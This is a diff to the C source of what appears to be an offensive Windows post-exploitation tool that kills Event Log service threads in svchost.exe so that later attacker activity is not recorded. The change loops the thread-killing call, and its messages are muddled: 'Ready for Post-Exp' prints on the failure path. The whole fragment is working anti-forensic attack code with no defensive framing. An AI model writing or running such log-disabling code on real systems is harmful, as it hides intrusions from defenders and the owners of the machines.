@@ -27,22 +27,30 @@ BOOL IfElevated()
 
 	printf("\n[*] Killing EventLog Threads (if running)\n");
 
-	// Killing EventLog Threads from the responsible svchost.exe process
+	// Killing EventLog Threads from the responsible svchost.exe processes
+	int i = 0;
 
-	if (KillEventLogThreads() == 0)
+	while (i == 0)
 	{
-		printf("\n[+] Ready for Post-Exp :)\n");
-	}
-	else
-	{
-		// Exit!
-		printf("[!] Failed to Kill EventLog Service OR, EventLog Service NOT running!\n");
+		if (KillEventLogThreads() != 0)
+		{
+			// Exit!
+			printf("[!] Failed to Kill EventLog Service OR, EventLog Service NOT running!\n");
 
-		// Assuming Event Log is NOT running!
-		// Updating Global flag Value -> FALSE (as EventLog Service is Not running => No Need of restarting it)
-		flag = FALSE;
-		return flag;
+			printf("\n[+] Ready for Post-Exp :)\n");
+
+			// Assuming Event Log is NOT running!
+			// Updating Global flag Value -> FALSE (as EventLog Service is Not running => No Need of restarting it)
+			flag = FALSE;
+			return flag;
+		}
+		else
+		{
+			//printf("\n[+] Ready for Post-Exp :)\n");
+			printf("\n[+] Killed responsible svchost.exe\n");
+		}
 	}
+
 	return TRUE;
 }
 
